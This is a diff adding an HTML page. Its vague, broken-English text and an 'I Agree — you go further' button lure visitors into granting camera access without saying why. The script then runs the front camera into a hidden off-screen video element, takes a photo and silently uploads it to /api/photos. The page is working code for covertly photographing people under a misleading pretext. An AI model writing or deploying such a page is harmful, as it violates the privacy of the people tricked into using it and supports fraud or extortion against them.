@@ -1,0 +1,177 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>HELLO SIR/MADAM THIS FOR YOU </title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 500px;
+            margin: 60px auto;
+            padding: 20px;
+            text-align: center;
+            line-height: 1.6;
+            background: #f5f6fa;
+        }
+
+        button {
+            padding: 14px 22px;
+            margin-top: 20px;
+            background: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 7px;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            background: gray;
+        }
+
+        #status {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+
+<body>
+
+<h2>This will you help here </h2>
+
+<p>
+    This is most important phase it will show more time
+</p>
+
+<p>
+    you are only the left person
+</p>
+
+<button id="captureUpload">
+    I Agree — you go further
+</button>
+
+<p id="status" role="status">
+    Waiting for your consent.
+</p>
+
+<!-- Camera stream is not displayed on the page -->
+<video id="camera"
+       autoplay
+       muted
+       playsinline
+       style="position:fixed;left:-9999px;width:1px;height:1px;">
+</video>
+
+<script>
+
+    const button = document.getElementById("captureUpload");
+    const video = document.getElementById("camera");
+    const status = document.getElementById("status");
+
+    button.addEventListener("click", async () => {
+
+        let stream = null;
+
+        button.disabled = true;
+
+        try {
+
+            status.textContent =
+                "Requesting camera permission...";
+
+            // Browser will show its native permission prompt
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" },
+                audio: false
+            });
+
+            video.srcObject = stream;
+
+            await video.play();
+
+            // Wait until camera frames are available
+            await new Promise(resolve => {
+
+                if (video.readyState >= 2 && video.videoWidth) {
+                    resolve();
+                } else {
+                    video.addEventListener(
+                        "loadeddata",
+                        resolve,
+                        { once: true }
+                    );
+                }
+
+            });
+
+            const canvas = document.createElement("canvas");
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            canvas.getContext("2d").drawImage(
+                video,
+                0,
+                0,
+                canvas.width,
+                canvas.height
+            );
+
+            status.textContent = "Preparing photo...";
+
+            const blob = await new Promise(resolve => {
+                canvas.toBlob(resolve, "image/jpeg", 0.85);
+            });
+
+            if (!blob) {
+                throw new Error("Photo capture failed.");
+            }
+
+            const formData = new FormData();
+
+            formData.append("photo", blob, "photo.jpg");
+
+            status.textContent = "Uploading photo...";
+
+            const response = await fetch("/api/photos", {
+                method: "POST",
+                body: formData
+            });
+
+            const result = await response.json();
+
+            if (!response.ok) {
+                throw new Error(
+                    result.message || "Upload failed."
+                );
+            }
+
+            status.textContent =
+                "Success: " + result.message;
+
+        } catch (error) {
+
+            status.textContent =
+                "Error: " + error.message;
+
+            button.disabled = false;
+
+        } finally {
+
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            video.srcObject = null;
+        }
+
+    });
+
+</script>
+
+</body>
+</html>
